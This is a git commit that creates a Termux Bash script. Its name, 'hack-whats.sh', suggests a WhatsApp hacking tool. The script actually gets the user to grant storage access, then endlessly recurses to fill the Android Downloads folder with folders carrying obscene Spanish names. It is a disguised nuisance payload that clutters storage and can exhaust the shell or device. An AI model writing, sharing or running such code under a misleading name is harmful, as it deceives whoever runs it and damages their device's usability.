46766cd50f9a0ef71c14f438186e7a9e1369889f
Dylan23145 <74885040+Dylan23145@users.noreply.github.com>
2022-02-26 18:10:02 -0500

    Create hack-whats.sh

---
+++ hack-whats.sh
@@ -0,0 +1,25 @@
+carpeta(){
+
+        nume=$(shuf -i 1-3000 -n 1)
+
+        mkdir PORNO_DE_ENANOS🔥🚫$nume
+
+        clear
+
+        carpeta
+
+        echo"PORNO_DE_ENANOS_VOLUMEN:$nume ==>creada"
+
+}
+
+clear
+
+echo " DALE EN ACEPTAR"
+
+sleep 1
+
+termux-setup-storage
+
+cd /data/data/com.termux/files/home/storage/downloads
+
+carpeta
